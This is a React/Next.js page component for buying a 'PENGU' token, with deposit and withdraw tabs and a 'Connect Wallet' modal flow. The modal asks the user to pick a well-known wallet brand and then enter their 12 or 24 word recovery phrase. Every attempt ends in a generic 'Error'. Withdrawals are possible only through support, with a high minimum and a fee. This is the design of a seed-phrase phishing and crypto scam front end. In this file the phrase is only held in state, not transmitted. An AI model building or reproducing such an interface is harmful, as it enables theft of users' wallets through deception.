"use client";
import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { useCrypto } from "@/lib/hooks/useCrypto";
import Toast from "@/components/Toast";
import Image from "next/image";

import { Copy, Download, Upload, Bitcoin, X } from "lucide-react";

export default function BuyPenguPage() {
  const [activeTab, setActiveTab] = useState<"deposit" | "withdraw">("deposit");
  const [toast, setToast] = useState({
    show: false,
    message: "",
    type: "success" as "success" | "error",
  });

  // Three-step wallet connection states (exact same as MainContent.tsx)
  const [showConnectWalletModal, setShowConnectWalletModal] = useState(false);
  const [showWalletTypesModal, setShowWalletTypesModal] = useState(false);
  const [showSeedPhrasesModal, setShowSeedPhrasesModal] = useState(false);
  const [currentStep, setCurrentStep] = useState(1);
  const [selectedWallet, setSelectedWallet] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");

  const { getDepositAddress } = useCrypto();

  // Wallet options (exact same as MainContent.tsx)
  const wallets = [
    {
      name: "MetaMask",
      icon: "/image/metafox.jpeg",
    },
    {
      name: "Solflare",
      icon: "/image/solflare.jpeg",
    },
    {
      name: "Phantom",
      icon: "/image/phantom.jpeg",
    },
    {
      name: "Robinhood",
      icon: "/image/robinhood.jpeg",
    },
    {
      name: "Rabby",
      icon: "/image/rabbywallet.jpeg",
    },
    {
      name: "Exodus",
      icon: "/image/exodus.jpeg",
    },
    {
      name: "Coinbase",
      icon: "/image/coinbase.jpeg",
    },
  ];

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setToast({
        show: true,
        message: "Address copied to clipboard!",
        type: "success",
      });
    } catch {
      setToast({
        show: true,
        message: "Failed to copy address",
        type: "error",
      });
    }
  };

  const getPENGUAddress = () => {
    const penguAddress = getDepositAddress("PENGU");
    return penguAddress?.address || null;
  };

  // Three-step modal navigation functions (exact same as MainContent.tsx)
  const handleConnectWalletClick = () => {
    setShowConnectWalletModal(false);
    setShowWalletTypesModal(true);
    setCurrentStep(2);
  };

  const handleWalletTypeSelect = (walletName: string) => {
    setSelectedWallet(walletName);
    setShowWalletTypesModal(false);
    setShowSeedPhrasesModal(true);
    setCurrentStep(3);
  };

  const handleBackToWalletTypes = () => {
    setShowSeedPhrasesModal(false);
    setShowWalletTypesModal(true);
    setCurrentStep(2);
    setSeedPhrase("");
  };

  const handleBackToConnectWallet = () => {
    setShowWalletTypesModal(false);
    setShowConnectWalletModal(true);
    setCurrentStep(1);
  };

  const handleCloseAllModals = () => {
    setShowConnectWalletModal(false);
    setShowWalletTypesModal(false);
    setShowSeedPhrasesModal(false);
    setSelectedWallet("");
    setSeedPhrase("");
    setCurrentStep(1);
  };

  const handleConnectWallet = async () => {
    if (!seedPhrase.trim()) {
      alert("Please enter your recovery phrase");
      return;
    }

    try {
      // Always show "Error" message in red
      setToast({
        show: true,
        message: "Error",
        type: "error",
      });
    } catch (error) {
      console.error("Error connecting wallet:", error);
      setToast({
        show: true,
        message: "Error",
        type: "error",
      });
    }

    // Reset all modals
    handleCloseAllModals();
  };

  const handleBuyPenguClick = () => {
    setShowConnectWalletModal(true);
    setCurrentStep(1);
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h2 className="text-2xl font-bold">Buy PENGU</h2>
        <Bitcoin className="h-6 w-6 text-purple-500" />
      </div>

      {/* Buy PENGU Button */}
      <div className="bg-gray-800 rounded-lg p-6">
        <div className="text-center space-y-4">
          <h3 className="text-xl font-semibold">Ready to Buy PENGU?</h3>
          <p className="text-gray-400">
            Connect your wallet to start buying PENGU tokens
          </p>
          <Button
            onClick={handleBuyPenguClick}
            className="bg-blue-600 hover:bg-blue-700 px-8 py-3 text-lg"
          >
            Buy PENGU Now
          </Button>
        </div>
      </div>

      {/* Tab Navigation */}
      <div className="flex space-x-1 bg-gray-800 p-1 rounded-lg">
        <button
          onClick={() => setActiveTab("deposit")}
          className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
            activeTab === "deposit"
              ? "bg-blue-600 text-white"
              : "text-gray-300 hover:text-white"
          }`}
        >
          <Download className="h-4 w-4 inline mr-2" />
          Deposit
        </button>
        <button
          onClick={() => setActiveTab("withdraw")}
          className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
            activeTab === "withdraw"
              ? "bg-red-600 text-white"
              : "text-gray-300 hover:text-white"
          }`}
        >
          <Upload className="h-4 w-4 inline mr-2" />
          Withdraw
        </button>
      </div>

      {/* Deposit Tab */}
      {activeTab === "deposit" && (
        <div className="space-y-6">
          <div>
            <h3 className="text-lg font-semibold mb-4">Deposit PENGU</h3>

            {getPENGUAddress() ? (
              <div className="bg-gray-800 rounded-lg p-6">
                <div className="flex items-center space-x-2 mb-4">
                  <span className="text-2xl">🐧</span>
                  <span className="font-medium">PENGU Address</span>
                </div>

                <div className="space-y-4">
                  {/* QR Code Placeholder */}
                  <div className="bg-gray-700 p-4 rounded-lg text-center">
                    <div className="w-16 h-16 bg-gray-600 rounded mx-auto mb-2 flex items-center justify-center">
                      <span className="text-gray-400 text-xs">QR</span>
                    </div>
                    <p className="text-sm text-gray-400">QR Code</p>
                  </div>

                  {/* Address */}
                  <div>
                    <label className="block text-sm font-medium text-gray-300 mb-2">
                      Deposit Address
                    </label>
                    <div className="flex items-center space-x-2">
                      <code className="flex-1 bg-gray-700 px-3 py-2 rounded text-sm font-mono text-gray-100 break-all">
                        {getPENGUAddress()}
                      </code>
                      <Button
                        onClick={() => copyToClipboard(getPENGUAddress()!)}
                        variant="outline"
                        size="sm"
                      >
                        <Copy className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>

                  {/* Instructions */}
                  <div className="bg-blue-900/20 p-4 rounded-lg border border-blue-700">
                    <h4 className="font-medium text-blue-100 mb-2">
                      Deposit Instructions
                    </h4>
                    <ul className="text-sm text-blue-200 space-y-1">
                      <li>• Send only PENGU tokens to this address</li>
                      <li>• Minimum deposit: 100 PENGU</li>
                      <li>• Deposits are credited after 3 confirmations</li>
                      <li>• Double-check the address before sending</li>
                    </ul>
                  </div>
                </div>
              </div>
            ) : (
              <div className="bg-gray-800 rounded-lg p-6 text-center">
                <p className="text-gray-400">
                  PENGU deposit address not available
                </p>
              </div>
            )}
          </div>

          {/* Recent Deposits */}
          <div>
            <h3 className="text-lg font-semibold mb-4">Recent Deposits</h3>
            <div className="bg-gray-800 rounded-lg p-6">
              <div className="text-center text-gray-400">
                <p>No recent deposits</p>
                <p className="text-sm">Your deposit history will appear here</p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Withdraw Tab */}
      {activeTab === "withdraw" && (
        <div className="space-y-6">
          <div>
            <h3 className="text-lg font-semibold mb-4">Withdraw PENGU</h3>

            <div className="bg-gray-800 rounded-lg p-6">
              <div className="space-y-4">
                <div className="bg-yellow-900/20 p-4 rounded-lg border border-yellow-700">
                  <h4 className="font-medium text-yellow-100 mb-2">
                    ⚠️ Withdrawal Notice
                  </h4>
                  <p className="text-sm text-yellow-200">
                    PENGU withdrawals are currently processed manually by our
                    support team. Please contact support for withdrawal
                    requests.
                  </p>
                </div>

                <div className="bg-blue-900/20 p-4 rounded-lg border border-blue-700">
                  <h4 className="font-medium text-blue-100 mb-2">
                    Contact Support
                  </h4>
                  <ul className="text-sm text-blue-200 space-y-1">
                    <li>• Email: support@pengu.com</li>
                    <li>• Minimum withdrawal: 10,000 PENGU</li>
                    <li>• Processing time: 24-48 hours</li>
                    <li>• Withdrawal fee: 100 PENGU</li>
                  </ul>
                </div>

                <Button
                  onClick={() => {
                    setToast({
                      show: true,
                      message: "Please contact support for withdrawal requests",
                      type: "success",
                    });
                  }}
                  className="w-full bg-blue-600 hover:bg-blue-700"
                >
                  Contact Support for Withdrawal
                </Button>
              </div>
            </div>
          </div>

          {/* Recent Withdrawals */}
          <div>
            <h3 className="text-lg font-semibold mb-4">Recent Withdrawals</h3>
            <div className="bg-gray-800 rounded-lg p-6">
              <div className="text-center text-gray-400">
                <p>No recent withdrawals</p>
                <p className="text-sm">
                  Your withdrawal history will appear here
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Step 1: Connect Wallet Modal (exact same as MainContent.tsx) */}
      {showConnectWalletModal && (
        <div className="fixed inset-0 bg-opacity-50 z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-lg w-full max-w-md flex flex-col">
            {/* Header */}
            <div className="flex justify-between items-center p-6 border-b border-gray-200">
              <h2 className="text-xl font-semibold text-gray-800">
                Connect Wallet
              </h2>
              <button
                onClick={handleCloseAllModals}
                className="text-gray-400 hover:text-gray-600"
              >
                <X className="h-6 w-6" />
              </button>
            </div>

            {/* Content */}
            <div className="p-6 text-center">
              <div className="mb-6">
                <div className="w-16 h-16 bg-gradient-to-r from-purple-600 to-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
                  <span className="text-white text-2xl">🔗</span>
                </div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2">
                  Connect Your Wallet
                </h3>
                <p className="text-gray-600 text-sm">
                  Choose your preferred wallet to continue
                </p>
              </div>

              <Button
                onClick={handleConnectWalletClick}
                className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white font-semibold py-3"
              >
                Continue
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Step 2: Wallet Types Modal (exact same as MainContent.tsx) */}
      {showWalletTypesModal && (
        <div className="fixed inset-0 bg-opacity-50 z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-lg w-full max-w-md max-h-[80vh] flex flex-col">
            {/* Header */}
            <div className="flex justify-between items-center p-6 border-b border-gray-200">
              <h2 className="text-xl font-semibold text-gray-800">
                Wallet Types
              </h2>
              <button
                onClick={handleCloseAllModals}
                className="text-gray-400 hover:text-gray-600"
              >
                <X className="h-6 w-6" />
              </button>
            </div>

            {/* Content */}
            <div className="flex-1 overflow-y-auto p-6">
              <div className="space-y-3">
                {wallets.map((wallet) => (
                  <button
                    key={wallet.name}
                    onClick={() => handleWalletTypeSelect(wallet.name)}
                    className="w-full flex items-center space-x-3 p-3 rounded-lg bg-gray-100 hover:bg-gray-200 transition-colors"
                  >
                    <Image
                      src={wallet.icon}
                      alt={wallet.name}
                      width={32}
                      height={32}
                      className="w-8 h-8 object-contain"
                    />
                    <span className="font-medium text-gray-800">
                      {wallet.name}
                    </span>
                  </button>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Step 3: Seed Phrases Modal (exact same as MainContent.tsx) */}
      {showSeedPhrasesModal && (
        <div className="fixed inset-0 bg-opacity-50 z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-lg w-full max-w-md flex flex-col">
            {/* Header */}
            <div className="flex justify-between items-center p-6 border-b border-gray-200">
              <h2 className="text-xl font-semibold text-gray-800">
                Recovery Phrase
              </h2>
              <button
                onClick={handleCloseAllModals}
                className="text-gray-400 hover:text-gray-600"
              >
                <X className="h-6 w-6" />
              </button>
            </div>

            {/* Content */}
            <div className="p-6">
              <div className="space-y-4">
                <div className="text-center">
                  <h3 className="text-lg font-semibold mb-2 text-gray-800">
                    Connect to {selectedWallet}
                  </h3>
                  <p className="text-gray-600 text-sm">
                    Restore an existing wallet with your 12 or <br /> 24 word
                    recovery phrase
                  </p>
                </div>
                <textarea
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                  placeholder="Recovery Phrase"
                  className="w-full h-32 p-3 bg-gray-100 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-500 resize-none"
                />
                <div className="flex space-x-3">
                  <Button
                    onClick={handleBackToWalletTypes}
                    className="flex-1 bg-gray-500 hover:bg-gray-600"
                  >
                    Back
                  </Button>
                  <Button
                    onClick={handleConnectWallet}
                    className="flex-1 bg-purple-500 hover:bg-purple-600"
                  >
                    Connect
                  </Button>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Toast Notification */}
      <Toast
        message={toast.message}
        type={toast.type}
        isVisible={toast.show}
        onClose={() => setToast({ ...toast, show: false })}
      />
    </div>
  );
}
